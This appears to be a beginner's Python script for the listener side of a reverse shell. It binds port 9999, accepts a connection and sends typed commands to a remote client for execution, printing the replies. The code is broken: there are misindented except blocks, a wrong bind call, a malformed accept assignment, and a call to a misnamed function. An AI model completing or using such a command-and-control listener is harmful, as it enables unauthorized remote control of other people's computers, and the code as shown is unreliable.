from distutils.log import error
from re import S
import socket
import sys

#creating a socket

def create_socket():
    try:
     global host
     global port
     global s 
     host = ""
     port=9999
     s = socket.socket()
except socket.error as msg:
    print("socket creation error" + str(msg))

#binding and listening for connections
def bind_socket():
    try:
     global host
     global port
     global s 

     print("binding the port " + str(port))

     s.bind(host,port)
     s.listen(5)

     except socket.error as msg:
         print("socket binding error" + str(msg) + "\n" + "Retrying")
         bind_socket()

#establish connection

def socket_accept():
    conn.address =  s.accept()
    print("connection established"+"IP" + address[0] + "Port" + str(address(1)))
    send_command(conn)
    conn.close()
#send commands 
def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

def main():
    create_socket()
    bind_socket()
    socket_accept()
main()